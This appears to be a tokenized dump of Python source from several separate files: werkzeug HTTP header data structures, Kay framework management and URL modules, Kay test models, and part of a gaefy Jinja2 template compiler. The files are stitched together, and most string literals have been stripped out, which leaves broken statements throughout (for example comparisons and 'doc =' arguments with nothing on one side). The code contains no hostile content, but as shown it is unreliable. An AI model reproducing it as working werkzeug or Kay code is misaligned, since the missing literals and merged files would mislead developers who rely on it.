~~~ raise ValueError ( % value ) \n 
\n 
~~ if not in item : \n 
~~~ return False \n 
~~ item_type , item_subtype = _normalize ( item ) \n 
if item_type == and item_subtype != : \n 
~~~ return False \n 
~~ return ( \n 
( item_type == item_subtype == or \n 
value_type == value_subtype == ) or \n 
( item_type == value_type and ( item_subtype == or \n 
value_subtype == or \n 
item_subtype == value_subtype ) ) \n 
) \n 
\n 
~~ @ property \n 
def accept_html ( self ) : \n 
~~~ """True if this object accepts HTML.""" \n 
return ( \n 
in self or \n 
in self or \n 
self . accept_xhtml \n 
) \n 
\n 
~~ @ property \n 
def accept_xhtml ( self ) : \n 
~~~ """True if this object accepts XHTML.""" \n 
return ( \n 
in self or \n 
in self \n 
) \n 
\n 
\n 
~~ ~~ class LanguageAccept ( Accept ) : \n 
~~~ """Like :class:`Accept` but with normalization for languages.""" \n 
\n 
def _value_matches ( self , value , item ) : \n 
~~~ def _normalize ( language ) : \n 
~~~ return _locale_delim_re . split ( language . lower ( ) ) \n 
~~ return item == or _normalize ( value ) == _normalize ( item ) \n 
\n 
\n 
~~ ~~ class CharsetAccept ( Accept ) : \n 
~~~ """Like :class:`Accept` but with normalization for charsets.""" \n 
\n 
def _value_matches ( self , value , item ) : \n 
~~~ def _normalize ( name ) : \n 
~~~ try : \n 
~~~ return codecs . lookup ( name ) . name \n 
~~ except LookupError : \n 
~~~ return name . lower ( ) \n 
~~ ~~ return item == or _normalize ( value ) == _normalize ( item ) \n 
\n 
\n 
~~ ~~ def cache_property ( key , empty , type ) : \n 
~~~ """Return a new property object for a cache header.  Useful if you\n    want to add support for a cache extension in a subclass.""" \n 
return property ( lambda x : x . _get_cache_value ( key , empty , type ) , \n 
lambda x , v : x . _set_cache_value ( key , v , type ) , \n 
lambda x : x . _del_cache_value ( key ) , \n 
% key ) \n 
\n 
\n 
~~ class _CacheControl ( UpdateDictMixin , dict ) : \n 
~~~ """Subclass of a dict that stores values for a Cache-Control header.  It\n    has accessors for all the cache-control directives specified in RFC 2616.\n    The class does not differentiate between request and response directives.\n\n    Because the cache-control directives in the HTTP header use dashes the\n    python descriptors use underscores for that.\n\n    To get a header of the :class:`CacheControl` object again you can convert\n    the object into a string or call the :meth:`to_header` method.  If you plan\n    to subclass it and add your own items have a look at the sourcecode for\n    that class.\n\n    .. versionchanged:: 0.4\n\n       Setting `no_cache` or `private` to boolean `True` will set the implicit\n       none-value which is ``*``:\n\n       >>> cc = ResponseCacheControl()\n       >>> cc.no_cache = True\n       >>> cc\n       <ResponseCacheControl \'no-cache\'>\n       >>> cc.no_cache\n       \'*\'\n       >>> cc.no_cache = None\n       >>> cc\n       <ResponseCacheControl \'\'>\n\n       In versions before 0.5 the behavior documented here affected the now\n       no longer existing `CacheControl` class.\n    """ \n 
\n 
no_cache = cache_property ( , , None ) \n 
no_store = cache_property ( , None , bool ) \n 
max_age = cache_property ( , - 1 , int ) \n 
no_transform = cache_property ( , None , None ) \n 
\n 
def __init__ ( self , values = ( ) , on_update = None ) : \n 
~~~ dict . __init__ ( self , values or ( ) ) \n 
self . on_update = on_update \n 
self . provided = values is not None \n 
\n 
~~ def _get_cache_value ( self , key , empty , type ) : \n 
~~~ """Used internally by the accessor properties.""" \n 
if type is bool : \n 
~~~ return key in self \n 
~~ if key in self : \n 
~~~ value = self [ key ] \n 
if value is None : \n 
~~~ return empty \n 
~~ elif type is not None : \n 
~~~ try : \n 
~~~ value = type ( value ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ ~~ return value \n 
\n 
~~ ~~ def _set_cache_value ( self , key , value , type ) : \n 
~~~ """Used internally by the accessor properties.""" \n 
if type is bool : \n 
~~~ if value : \n 
~~~ self [ key ] = None \n 
~~ else : \n 
~~~ self . pop ( key , None ) \n 
~~ ~~ else : \n 
~~~ if value is None : \n 
~~~ self . pop ( key ) \n 
~~ elif value is True : \n 
~~~ self [ key ] = None \n 
~~ else : \n 
~~~ self [ key ] = value \n 
\n 
~~ ~~ ~~ def _del_cache_value ( self , key ) : \n 
~~~ """Used internally by the accessor properties.""" \n 
if key in self : \n 
~~~ del self [ key ] \n 
\n 
~~ ~~ def to_header ( self ) : \n 
~~~ """Convert the stored values into a cache control header.""" \n 
return dump_header ( self ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . to_header ( ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
self . to_header ( ) \n 
) \n 
\n 
\n 
~~ ~~ class RequestCacheControl ( ImmutableDictMixin , _CacheControl ) : \n 
~~~ """A cache control for requests.  This is immutable and gives access\n    to all the request-relevant cache control headers.\n\n    To get a header of the :class:`RequestCacheControl` object again you can\n    convert the object into a string or call the :meth:`to_header` method.  If\n    you plan to subclass it and add your own items have a look at the sourcecode\n    for that class.\n\n    .. versionadded:: 0.5\n       In previous versions a `CacheControl` class existed that was used\n       both for request and response.\n    """ \n 
\n 
max_stale = cache_property ( , , int ) \n 
min_fresh = cache_property ( , , int ) \n 
no_transform = cache_property ( , None , None ) \n 
only_if_cached = cache_property ( , None , bool ) \n 
\n 
\n 
~~ class ResponseCacheControl ( _CacheControl ) : \n 
~~~ """A cache control for responses.  Unlike :class:`RequestCacheControl`\n    this is mutable and gives access to response-relevant cache control\n    headers.\n\n    To get a header of the :class:`ResponseCacheControl` object again you can\n    convert the object into a string or call the :meth:`to_header` method.  If\n    you plan to subclass it and add your own items have a look at the sourcecode\n    for that class.\n\n    .. versionadded:: 0.5\n       In previous versions a `CacheControl` class existed that was used\n       both for request and response.\n    """ \n 
\n 
public = cache_property ( , None , bool ) \n 
private = cache_property ( , , None ) \n 
must_revalidate = cache_property ( , None , bool ) \n 
proxy_revalidate = cache_property ( , None , bool ) \n 
s_maxage = cache_property ( , None , None ) \n 
\n 
\n 
# attach cache_property to the _CacheControl as staticmethod \n 
# so that others can reuse it. \n 
~~ _CacheControl . cache_property = staticmethod ( cache_property ) \n 
\n 
\n 
class CallbackDict ( UpdateDictMixin , dict ) : \n 
~~~ """A dict that calls a function passed every time something is changed.\n    The function is passed the dict instance.\n    """ \n 
\n 
def __init__ ( self , initial = None , on_update = None ) : \n 
~~~ dict . __init__ ( self , initial or ( ) ) \n 
self . on_update = on_update \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
dict . __repr__ ( self ) \n 
) \n 
\n 
\n 
~~ ~~ class HeaderSet ( object ) : \n 
~~~ """Similar to the :class:`ETags` class this implements a set-like structure.\n    Unlike :class:`ETags` this is case insensitive and used for vary, allow, and\n    content-language headers.\n\n    If not constructed using the :func:`parse_set_header` function the\n    instantiation works like this:\n\n    >>> hs = HeaderSet([\'foo\', \'bar\', \'baz\'])\n    >>> hs\n    HeaderSet([\'foo\', \'bar\', \'baz\'])\n    """ \n 
\n 
def __init__ ( self , headers = None , on_update = None ) : \n 
~~~ self . _headers = list ( headers or ( ) ) \n 
self . _set = set ( [ x . lower ( ) for x in self . _headers ] ) \n 
self . on_update = on_update \n 
\n 
~~ def add ( self , header ) : \n 
~~~ """Add a new header to the set.""" \n 
self . update ( ( header , ) ) \n 
\n 
~~ def remove ( self , header ) : \n 
~~~ """Remove a header from the set.  This raises an :exc:`KeyError` if the\n        header is not in the set.\n\n        .. versionchanged:: 0.5\n            In older versions a :exc:`IndexError` was raised instead of a\n            :exc:`KeyError` if the object was missing.\n\n        :param header: the header to be removed.\n        """ \n 
key = header . lower ( ) \n 
if key not in self . _set : \n 
~~~ raise KeyError ( header ) \n 
~~ self . _set . remove ( key ) \n 
for idx , key in enumerate ( self . _headers ) : \n 
~~~ if key . lower ( ) == header : \n 
~~~ del self . _headers [ idx ] \n 
break \n 
~~ ~~ if self . on_update is not None : \n 
~~~ self . on_update ( self ) \n 
\n 
~~ ~~ def update ( self , iterable ) : \n 
~~~ """Add all the headers from the iterable to the set.\n\n        :param iterable: updates the set with the items from the iterable.\n        """ \n 
inserted_any = False \n 
for header in iterable : \n 
~~~ key = header . lower ( ) \n 
if key not in self . _set : \n 
~~~ self . _headers . append ( header ) \n 
self . _set . add ( key ) \n 
inserted_any = True \n 
~~ ~~ if inserted_any and self . on_update is not None : \n 
~~~ self . on_update ( self ) \n 
\n 
~~ ~~ def discard ( self , header ) : \n 
~~~ """Like :meth:`remove` but ignores errors.\n\n        :param header: the header to be discarded.\n        """ \n 
try : \n 
~~~ return self . remove ( header ) \n 
~~ except KeyError : \n 
~~~ pass \n 
\n 
~~ ~~ def find ( self , header ) : \n 
~~~ """Return the index of the header in the set or return -1 if not found.\n\n        :param header: the header to be looked up.\n        """ \n 
header = header . lower ( ) \n 
for idx , item in enumerate ( self . _headers ) : \n 
~~~ if item . lower ( ) == header : \n 
~~~ return idx \n 
~~ ~~ return - 1 \n 
\n 
~~ def index ( self , header ) : \n 
~~~ """Return the index of the header in the set or raise an\n        :exc:`IndexError`.\n\n        :param header: the header to be looked up.\n        """ \n 
rv = self . find ( header ) \n 
if rv < 0 : \n 
~~~ raise IndexError ( header ) \n 
~~ return rv \n 
\n 
~~ def clear ( self ) : \n 
~~~ """Clear the set.""" \n 
self . _set . clear ( ) \n 
del self . _headers [ : ] \n 
if self . on_update is not None : \n 
~~~ self . on_update ( self ) \n 
\n 
~~ ~~ def as_set ( self , preserve_casing = False ) : \n 
~~~ """Return the set as real python set type.  When calling this, all\n        the items are converted to lowercase and the ordering is lost.\n\n        :param preserve_casing: if set to `True` the items in the set returned\n                                will have the original case like in the\n                                :class:`HeaderSet`, otherwise they will\n                                be lowercase.\n        """ \n 
if preserve_casing : \n 
~~~ return set ( self . _headers ) \n 
~~ return set ( self . _set ) \n 
\n 
~~ def to_header ( self ) : \n 
~~~ """Convert the header set into an HTTP header string.""" \n 
return . join ( map ( quote_header_value , self . _headers ) ) \n 
\n 
~~ def __getitem__ ( self , idx ) : \n 
~~~ return self . _headers [ idx ] \n 
\n 
~~ def __delitem__ ( self , idx ) : \n 
~~~ rv = self . _headers . pop ( idx ) \n 
self . _set . remove ( rv . lower ( ) ) \n 
if self . on_update is not None : \n 
~~~ self . on_update ( self ) \n 
\n 
~~ ~~ def __setitem__ ( self , idx , value ) : \n 
~~~ old = self . _headers [ idx ] \n 
self . _set . remove ( old . lower ( ) ) \n 
self . _headers [ idx ] = value \n 
self . _set . add ( value . lower ( ) ) \n 
if self . on_update is not None : \n 
~~~ self . on_update ( self ) \n 
\n 
~~ ~~ def __contains__ ( self , header ) : \n 
~~~ return header . lower ( ) in self . _set \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . _set ) \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ return iter ( self . _headers ) \n 
\n 
~~ def __nonzero__ ( self ) : \n 
~~~ return bool ( self . _set ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . to_header ( ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
self . _headers \n 
) \n 
\n 
\n 
~~ ~~ class ETags ( object ) : \n 
~~~ """A set that can be used to check if one etag is present in a collection\n    of etags.\n    """ \n 
\n 
def __init__ ( self , strong_etags = None , weak_etags = None , star_tag = False ) : \n 
~~~ self . _strong = frozenset ( not star_tag and strong_etags or ( ) ) \n 
self . _weak = frozenset ( weak_etags or ( ) ) \n 
self . star_tag = star_tag \n 
\n 
~~ def as_set ( self , include_weak = False ) : \n 
~~~ """Convert the `ETags` object into a python set.  Per default all the\n        weak etags are not part of this set.""" \n 
rv = set ( self . _strong ) \n 
if include_weak : \n 
~~~ rv . update ( self . _weak ) \n 
~~ return rv \n 
\n 
~~ def is_weak ( self , etag ) : \n 
~~~ """Check if an etag is weak.""" \n 
return etag in self . _weak \n 
\n 
~~ def contains_weak ( self , etag ) : \n 
~~~ """Check if an etag is part of the set including weak and strong tags.""" \n 
return self . is_weak ( etag ) or self . contains ( etag ) \n 
\n 
~~ def contains ( self , etag ) : \n 
~~~ """Check if an etag is part of the set ignoring weak tags.""" \n 
if self . star_tag : \n 
~~~ return True \n 
~~ return etag in self . _strong \n 
\n 
~~ def contains_raw ( self , etag ) : \n 
~~~ """When passed a quoted tag it will check if this tag is part of the\n        set.  If the tag is weak it is checked against weak and strong tags,\n        otherwise strong only.""" \n 
etag , weak = unquote_etag ( etag ) \n 
if weak : \n 
~~~ return self . contains_weak ( etag ) \n 
~~ return self . contains ( etag ) \n 
\n 
~~ def to_header ( self ) : \n 
~~~ """Convert the etags set into a HTTP header string.""" \n 
if self . star_tag : \n 
~~~ return \n 
~~ return . join ( \n 
[ \'"%s"\' % x for x in self . _strong ] + \n 
[ \'w/"%s"\' % x for x in self . _weak ] \n 
) \n 
\n 
~~ def __call__ ( self , etag = None , data = None , include_weak = False ) : \n 
~~~ if [ etag , data ] . count ( None ) != 1 : \n 
~~~ raise TypeError ( ) \n 
~~ if etag is None : \n 
~~~ etag = generate_etag ( data ) \n 
~~ if include_weak : \n 
~~~ if etag in self . _weak : \n 
~~~ return True \n 
~~ ~~ return etag in self . _strong \n 
\n 
~~ def __nonzero__ ( self ) : \n 
~~~ return bool ( self . star_tag or self . _strong ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . to_header ( ) \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ return iter ( self . _strong ) \n 
\n 
~~ def __contains__ ( self , etag ) : \n 
~~~ return self . contains ( etag ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( self . __class__ . __name__ , str ( self ) ) \n 
\n 
\n 
~~ ~~ class Authorization ( ImmutableDictMixin , dict ) : \n 
~~~ """Represents an `Authorization` header sent by the client.  You should\n    not create this kind of object yourself but use it when it\'s returned by\n    the `parse_authorization_header` function.\n\n    This object is a dict subclass and can be altered by setting dict items\n    but it should be considered immutable as it\'s returned by the client and\n    not meant for modifications.\n\n    .. versionchanged:: 0.5\n       This object became immutable.\n    """ \n 
\n 
def __init__ ( self , auth_type , data = None ) : \n 
~~~ dict . __init__ ( self , data or { } ) \n 
self . type = auth_type \n 
\n 
~~ username = property ( lambda x : x . get ( ) , doc = ) \n 
password = property ( lambda x : x . get ( ) , doc = ) \n 
realm = property ( lambda x : x . get ( ) , doc = ) \n 
nonce = property ( lambda x : x . get ( ) , doc = ) \n 
uri = property ( lambda x : x . get ( ) , doc = ) \n 
nc = property ( lambda x : x . get ( ) , doc = ) \n 
cnonce = property ( lambda x : x . get ( ) , doc = ) \n 
response = property ( lambda x : x . get ( ) , doc = ) \n 
opaque = property ( lambda x : x . get ( ) , doc = ) \n 
\n 
@ property \n 
def qop ( self ) : \n 
~~~ """Indicates what "quality of protection" the client has applied to\n        the message for HTTP digest auth.""" \n 
def on_update ( header_set ) : \n 
~~~ if not header_set and in self : \n 
~~~ del self [ ] \n 
~~ elif header_set : \n 
~~~ self [ ] = header_set . to_header ( ) \n 
~~ ~~ return parse_set_header ( self . get ( ) , on_update ) \n 
\n 
\n 
~~ ~~ class WWWAuthenticate ( UpdateDictMixin , dict ) : \n 
~~~ """Provides simple access to `WWW-Authenticate` headers.""" \n 
\n 
#: list of keys that require quoting in the generated header \n 
_require_quoting = frozenset ( [ , , , ] ) \n 
\n 
def __init__ ( self , auth_type = None , values = None , on_update = None ) : \n 
~~~ dict . __init__ ( self , values or ( ) ) \n 
if auth_type : \n 
~~~ self [ ] = auth_type \n 
~~ self . on_update = on_update \n 
\n 
~~ def set_basic ( self , realm = ) : \n 
~~~ """Clear the auth info and enable basic auth.""" \n 
dict . clear ( self ) \n 
dict . update ( self , { : , : realm } ) \n 
if self . on_update : \n 
~~~ self . on_update ( self ) \n 
\n 
~~ ~~ def set_digest ( self , realm , nonce , qop = ( , ) , opaque = None , \n 
algorithm = None , stale = False ) : \n 
~~~ """Clear the auth info and enable digest auth.""" \n 
d = { \n 
: , \n 
: realm , \n 
: nonce , \n 
: dump_header ( qop ) \n 
} \n 
if stale : \n 
~~~ d [ ] = \n 
~~ if opaque is not None : \n 
~~~ d [ ] = opaque \n 
~~ if algorithm is not None : \n 
~~~ d [ ] = algorithm \n 
~~ dict . clear ( self ) \n 
dict . update ( self , d ) \n 
if self . on_update : \n 
~~~ self . on_update ( self ) \n 
\n 
~~ ~~ def to_header ( self ) : \n 
~~~ """Convert the stored values into a WWW-Authenticate header.""" \n 
d = dict ( self ) \n 
auth_type = d . pop ( , None ) or \n 
return % ( auth_type . title ( ) , . join ( [ \n 
% ( key , quote_header_value ( value , \n 
allow_token = key not in self . _require_quoting ) ) \n 
for key , value in d . iteritems ( ) \n 
] ) ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . to_header ( ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
self . to_header ( ) \n 
) \n 
\n 
~~ def auth_property ( name , doc = None ) : \n 
~~~ """A static helper function for subclasses to add extra authentication\n        system properties onto a class::\n\n            class FooAuthenticate(WWWAuthenticate):\n                special_realm = auth_property(\'special_realm\')\n\n        For more information have a look at the sourcecode to see how the\n        regular properties (:attr:`realm` etc.) are implemented.\n        """ \n 
def _set_value ( self , value ) : \n 
~~~ if value is None : \n 
~~~ self . pop ( name , None ) \n 
~~ else : \n 
~~~ self [ name ] = str ( value ) \n 
~~ ~~ return property ( lambda x : x . get ( name ) , _set_value , doc = doc ) \n 
\n 
~~ def _set_property ( name , doc = None ) : \n 
~~~ def fget ( self ) : \n 
~~~ def on_update ( header_set ) : \n 
~~~ if not header_set and name in self : \n 
~~~ del self [ name ] \n 
~~ elif header_set : \n 
~~~ self [ name ] = header_set . to_header ( ) \n 
~~ ~~ return parse_set_header ( self . get ( name ) , on_update ) \n 
~~ return property ( fget , doc = doc ) \n 
\n 
~~ type = auth_property ( , doc = ) \n 
realm = auth_property ( , doc = ) \n 
domain = _set_property ( , doc = ) \n 
nonce = auth_property ( , doc = ) \n 
opaque = auth_property ( , doc = ) \n 
algorithm = auth_property ( , doc = \'\'\'\n        A string indicating a pair of algorithms used to produce the digest\n        and a checksum.  If this is not present it is assumed to be "MD5".\n        If the algorithm is not understood, the challenge should be ignored\n        (and a different one used, if there is more than one).\'\'\' ) \n 
qop = _set_property ( , doc = ) \n 
\n 
def _get_stale ( self ) : \n 
~~~ val = self . get ( ) \n 
if val is not None : \n 
~~~ return val . lower ( ) == \n 
~~ ~~ def _set_stale ( self , value ) : \n 
~~~ if value is None : \n 
~~~ self . pop ( , None ) \n 
~~ else : \n 
~~~ self [ ] = value and or \n 
~~ ~~ stale = property ( _get_stale , _set_stale , doc = ) \n 
del _get_stale , _set_stale \n 
\n 
# make auth_property a staticmethod so that subclasses of \n 
# `WWWAuthenticate` can use it for new properties. \n 
auth_property = staticmethod ( auth_property ) \n 
del _set_property \n 
\n 
\n 
~~ class FileStorage ( object ) : \n 
~~~ """The :class:`FileStorage` class is a thin wrapper over incoming files.\n    It is used by the request object to represent uploaded files.  All the\n    attributes of the wrapper stream are proxied by the file storage so\n    it\'s possible to do ``storage.read()`` instead of the long form\n    ``storage.stream.read()``.\n    """ \n 
\n 
def __init__ ( self , stream = None , filename = None , name = None , \n 
content_type = , content_length = - 1 , \n 
headers = None ) : \n 
~~~ self . name = name \n 
self . stream = stream or _empty_stream \n 
self . filename = filename or getattr ( stream , , None ) \n 
self . content_type = content_type \n 
self . content_length = content_length \n 
if headers is None : \n 
~~~ headers = Headers ( ) \n 
~~ self . headers = headers \n 
\n 
~~ def save ( self , dst , buffer_size = 16384 ) : \n 
~~~ """Save the file to a destination path or file object.  If the\n        destination is a file object you have to close it yourself after the\n        call.  The buffer size is the number of bytes held in memory during\n        the copy process.  It defaults to 16KB.\n\n        For secure file saving also have a look at :func:`secure_filename`.\n\n        :param dst: a filename or open file object the uploaded file\n                    is saved to.\n        :param buffer_size: the size of the buffer.  This works the same as\n                            the `length` parameter of\n                            :func:`shutil.copyfileobj`.\n        """ \n 
from shutil import copyfileobj \n 
close_dst = False \n 
if isinstance ( dst , basestring ) : \n 
~~~ dst = file ( dst , ) \n 
close_dst = True \n 
~~ try : \n 
~~~ copyfileobj ( self . stream , dst , buffer_size ) \n 
~~ finally : \n 
~~~ if close_dst : \n 
~~~ dst . close ( ) \n 
\n 
~~ ~~ ~~ def close ( self ) : \n 
~~~ """Close the underlying file if possible.""" \n 
try : \n 
~~~ self . stream . close ( ) \n 
~~ except : \n 
~~~ pass \n 
\n 
~~ ~~ def __nonzero__ ( self ) : \n 
~~~ return bool ( self . filename ) \n 
\n 
~~ def __getattr__ ( self , name ) : \n 
~~~ return getattr ( self . stream , name ) \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ return iter ( self . readline , ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
self . filename , \n 
self . content_type \n 
) \n 
\n 
\n 
# circular dependencies \n 
~~ ~~ from werkzeug . http import dump_options_header , dump_header , generate_etag , quote_header_value , parse_set_header , unquote_etag \n 
\n 
\n 
# create all the special key errors now that the classes are defined. \n 
from werkzeug . exceptions import BadRequest \n 
for _cls in MultiDict , OrderedMultiDict , CombinedMultiDict , Headers , EnvironHeaders : \n 
~~~ _cls . KeyError = BadRequest . wrap ( KeyError , _cls . __name__ + ) \n 
~~ del _cls \n 
# -*- coding: utf-8 -*- \n 
\n 
"""\nkay.management\n\n:Copyright: (c) 2009 Accense Technology, Inc. \n                     Takashi Matsuo <tmatsuo@candit.jp>,\n                     All rights reserved.\n:license: BSD, see LICENSE for more details.\n\nTaken from django.\n""" \n 
\n 
\n 
import sys \n 
import os \n 
\n 
from werkzeug . utils import import_string \n 
\n 
from kay . management . shell import ( \n 
rshell , shell , clear_datastore , create_user , \n 
) \n 
from kay . management . runserver import runserver_passthru_argv \n 
from kay . management . startapp import startapp \n 
from kay . management . startapp import startproject \n 
from kay . management . appcfg import do_appcfg_passthru_argv \n 
from kay . management . bulkloader import ( \n 
do_bulkloader_passthru_argv , dump_all , restore_all , \n 
) \n 
from kay . management . test import do_runtest \n 
from kay . management . preparse import do_preparse_bundle \n 
from kay . management . preparse import do_preparse_apps \n 
from kay . management . extract_messages import do_extract_messages \n 
from kay . management . add_translations import do_add_translations \n 
from kay . management . update_translations import do_update_translations \n 
from kay . management . compile_translations import do_compile_translations \n 
from kay . management . wxadmin import do_wxadmin \n 
from kay . management . compile_media import do_compile_media \n 
\n 
from kay . conf import settings \n 
\n 
action_dump_all = dump_all \n 
action_restore_all = restore_all \n 
action_shell = shell \n 
action_rshell = rshell \n 
action_startapp = startapp \n 
action_startproject = startproject \n 
action_test = do_runtest \n 
action_preparse_bundle = do_preparse_bundle \n 
action_preparse_apps = do_preparse_apps \n 
action_extract_messages = do_extract_messages \n 
action_add_translations = do_add_translations \n 
action_update_translations = do_update_translations \n 
action_compile_translations = do_compile_translations \n 
action_appcfg = do_appcfg_passthru_argv \n 
action_runserver = runserver_passthru_argv \n 
action_bulkloader = do_bulkloader_passthru_argv \n 
action_clear_datastore = clear_datastore \n 
action_create_user = create_user \n 
action_wxadmin = do_wxadmin \n 
action_compile_media = do_compile_media \n 
\n 
additional_actions = [ ] \n 
\n 
for app in settings . INSTALLED_APPS : \n 
~~~ try : \n 
~~~ appmod = import_string ( app ) \n 
if not os . path . exists ( os . path . join ( os . path . dirname ( appmod . __file__ ) , \n 
) ) : \n 
~~~ continue \n 
~~ management_mod = import_string ( "%s.management" % app ) \n 
for name , val in vars ( management_mod ) . iteritems ( ) : \n 
~~~ if name . startswith ( "action_" ) : \n 
~~~ locals ( ) [ name ] = getattr ( management_mod , name ) \n 
additional_actions . append ( name ) \n 
~~ ~~ ~~ except Exception , e : \n 
~~~ import traceback \n 
sys . stderr . write ( . join ( traceback . format_exception ( * ( sys . exc_info ( ) ) ) ) ) \n 
pass \n 
\n 
~~ ~~ __all__ = [ \n 
, , , \n 
, , , \n 
, , , \n 
, , , , \n 
, , , , , \n 
, , \n 
\n 
, , , , \n 
, , , \n 
, , , \n 
, , \n 
, , , \n 
, , , \n 
, , \n 
] + additional_actions \n 
\n 
def print_status ( msg ) : \n 
~~~ print ( msg ) \n 
sys . stdout . flush ( ) \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ """\nKay registration urls.\n\n:Copyright: (c) 2009 Takashi Matsuo <tmatsuo@candit.jp> All rights reserved.\n:license: BSD, see LICENSE for more details.\n""" \n 
\n 
from kay . routing import ( \n 
ViewGroup , Rule \n 
) \n 
\n 
view_groups = [ \n 
ViewGroup ( \n 
Rule ( , endpoint = , \n 
view = ( , ( ) , { } ) ) , \n 
Rule ( , endpoint = , \n 
view = ( , ( ) , { } ) ) , \n 
Rule ( , endpoint = , \n 
view = ) , \n 
) \n 
] \n 
\n 
# -*- coding: utf-8 -*- \n 
\n 
"""\nModels for Kay tests.\n\n:Copyright: (c) 2009 Accense Technology, Inc. All rights reserved.\n:license: BSD, see LICENSE for more details.\n""" \n 
\n 
from google . appengine . ext import db \n 
\n 
from kay . utils . forms import ValidationError \n 
from kay . utils . forms . modelform import ModelForm \n 
\n 
class MaxLengthValidator ( object ) : \n 
\n 
~~~ def __init__ ( self , length ) : \n 
~~~ self . length = length \n 
\n 
~~ def __call__ ( self , val ) : \n 
~~~ if len ( val ) > self . length : \n 
~~~ raise ValidationError ( "Too long" ) \n 
~~ return True \n 
\n 
\n 
~~ ~~ class TestModel ( db . Model ) : \n 
~~~ number = db . IntegerProperty ( required = True ) \n 
data_field = db . StringProperty ( required = True , \n 
validator = MaxLengthValidator ( 20 ) ) \n 
is_active = db . BooleanProperty ( required = True ) \n 
string_list_field = db . StringListProperty ( required = True ) \n 
\n 
~~ class TestModel2 ( db . Model ) : \n 
~~~ number = db . IntegerProperty ( required = True ) \n 
data_field = db . StringProperty ( required = True , \n 
validator = MaxLengthValidator ( 20 ) ) \n 
is_active = db . BooleanProperty ( required = True ) \n 
string_list_field = db . StringListProperty ( required = True ) \n 
\n 
\n 
~~ class TestModelForm ( ModelForm ) : \n 
~~~ csrf_protected = False \n 
class Meta ( ) : \n 
~~~ model = TestModel \n 
~~ def __init__ ( self , instance = None , initial = None ) : \n 
~~~ super ( TestModelForm , self ) . __init__ ( instance , initial ) \n 
self . string_list_field . min_size = 1 \n 
\n 
\n 
~~ ~~ class JsonTestModel ( db . Model ) : \n 
~~~ s = db . StringProperty ( ) \n 
i = db . IntegerProperty ( ) \n 
b = db . BooleanProperty ( ) \n 
l = db . StringListProperty ( ) \n 
r = db . ReferenceProperty ( ) \n 
\n 
~~ class ModelFormTestModel ( db . Model ) : \n 
~~~ s_name = db . StringProperty ( ) \n 
zip_code = db . StringProperty ( ) \n 
addr = db . StringProperty ( ) \n 
\n 
~~ class ModelFormTestForm ( ModelForm ) : \n 
~~~ csrf_protected = False \n 
class Meta : \n 
~~~ model = ModelFormTestModel \n 
fields = ( ) \n 
\n 
~~ ~~ class ValidationTestModel ( db . Model ) : \n 
~~~ slist = db . StringListProperty ( ) \n 
\n 
~~ class ValidationTestForm ( ModelForm ) : \n 
~~~ csrf_protected = False \n 
class Meta : \n 
~~~ model = ValidationTestModel \n 
~~ def context_validate ( self , data ) : \n 
~~~ raise ValidationError ( "Error!" ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ """\ngaefy.jinja2.compiler\n~~~~~~~~~~~~~~~~~~~~~\n\nHelper functions to parse Jinja2 templates and store them as Python code.\nThe compiled templates can be loaded using gaefy.jinja2.code_loaders,\navoiding all the parsing process.\n\nTo compile a whole dir:\n\n  from jinja2 import Environment\n  from gaefy.jinja2.compiler import compile_dir\n\n  env = Environment(extensions=[\'jinja2.ext.i18n\'])\n  src_path = \'/path/to/templates\'\n  dst_path = \'/path/to/templates_compiled\'\n\n  compile_dir(env, src_path, dst_path)\n\n:copyright: 2009 by tipfy.org.\n:license: BSD, see LICENSE.txt for more details.\n""" \n 
import re \n 
import sys \n 
from os import path , listdir , mkdir \n 
\n 
def compile_file ( env , src_path , dst_path , encoding = , base_dir = ) : \n 
~~~ """Compiles a Jinja2 template to python code.\n  Params:\n    `env`: a Jinja2 Environment instance.\n    `src_path`: path to the source file.\n    `dst_path`: path to the destination file.\n    `encoding`: template encoding.\n    `base_dir`: the base path to be removed from the compiled template\n      filename.\n  """ \n 
# Read the template file. \n 
src_file = file ( src_path , ) \n 
try : \n 
~~~ source = src_file . read ( ) . decode ( encoding ) \n 
~~ except Exception , e : \n 
~~~ sys . stderr . write ( "Failed compiling %s. Perhaps you can check the character" \n 
" set of this file.\\n" % src_path ) \n 
raise \n 
~~ src_file . close ( ) \n 
\n 
# Compile the template to raw Python code.. \n 
name = src_path . replace ( base_dir , ) \n 
raw = env . compile ( source , name = name , filename = name , raw = True ) \n 
\n 
# Save to the destination. \n 
dst_file = open ( dst_path , ) \n 
dst_file . write ( raw ) \n 
dst_file . close ( ) \n 
\n 
\n 
~~ def compile_dir ( env , src_path , dst_path , pattern = , \n 
encoding = , base_dir = None , \n 
negative_pattern = ) : \n 
~~~ """Compiles a directory of Jinja2 templates to python code.\n  Params:\n    `env`: a Jinja2 Environment instance.\n    `src_path`: path to the source directory.\n    `dst_path`: path to the destination directory.\n    `encoding`: template encoding.\n    `pattern`: a regular expression to match template file names.\n    `base_dir`: the base path to be removed from the compiled template\n      filename.\n  """ \n 
if base_dir is None : \n 
# In the first call, store the base dir. \n 
~~~ base_dir = src_path \n 
\n 
~~ for filename in listdir ( src_path ) : \n 
~~~ if filename . startswith ( "." ) : \n 
~~~ continue \n 
~~ src_name = path . join ( src_path , filename ) \n 
dst_name = path . join ( dst_path , filename ) \n 
\n 
if path . isdir ( src_name ) : \n 
~~~ if not path . isdir ( dst_name ) : \n 
~~~ mkdir ( dst_name ) \n 
